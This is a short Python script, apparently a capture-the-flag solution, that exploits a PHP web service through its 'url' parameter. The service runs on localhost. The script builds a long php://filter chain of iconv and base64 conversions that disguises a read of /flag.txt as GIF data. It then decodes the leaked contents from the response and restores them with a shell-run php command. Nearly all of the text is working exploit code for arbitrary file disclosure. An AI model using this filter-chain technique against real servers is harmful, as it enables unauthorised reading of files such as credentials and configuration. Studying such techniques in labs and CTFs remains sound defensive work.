url = "php://filter/convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|/resource=/flag.txt"

import requests
import re
import base64
import os
from imapclient import imap_utf7

HOST = "localhost"
PORT = 8001

r = requests.get(f"http://{HOST}:{PORT}/", params={"url": url})
b = base64.b64decode(re.findall("gif;base64,(.+)\"", r.text)[0])
v = base64.b64decode(b[len("GIF89a"):] + b'==')
out = ""
for c in v:
    if 0x20 <= c and c <= 0x7e:
        out += chr(c)
print(f"php -r 'echo file_get_contents(\"php://filter/convert.iconv.UTF7.UTF8/resource=data:,\".urlencode(\"{out}\"));'")
os.system(f"php -r 'echo file_get_contents(\"php://filter/convert.iconv.UTF7.UTF8/resource=data:,\".urlencode(\"{out}\"));'")
print()
